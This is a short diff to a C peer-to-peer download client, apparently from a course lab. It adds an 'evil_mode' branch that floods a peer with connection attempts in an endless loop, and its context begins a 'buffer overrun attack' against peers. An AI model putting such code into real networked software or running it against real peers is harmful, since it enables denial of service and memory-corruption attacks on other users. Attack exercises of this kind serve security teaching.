@@ -536,11 +536,23 @@ static void task_download(task_t *t, task_t *tracker_task)
 	message("* Connecting to %s:%d ",//to download '%s'\n",
 		inet_ntoa(t->peer_list->addr), t->peer_list->port);
 //		t->filename);
-	t->peer_fd = open_socket(t->peer_list->addr, t->peer_list->port);
-	if (t->peer_fd == -1) {
-		error("* Cannot connect to peer: %s\n", strerror(errno));
-		goto try_again;
-	}
+
+  if (evil_mode == 2) {
+    while (1) {
+      t->peer_fd = open_socket(t->peer_list->addr, t->peer_list->port);
+
+      if (t->peer_fd == -1) {
+        perror("dox crashed peer\n");
+      }
+    }
+  } else {
+    t->peer_fd = open_socket(t->peer_list->addr, t->peer_list->port);
+    if (t->peer_fd == -1) {
+      error("* Cannot connect to peer: %s\n", strerror(errno));
+      goto try_again;
+    }
+  }
+
 	if (evil_mode == 1) {
 		// buffer overrun attack
 		char overrun_attack[FILENAMESIZ * 3];
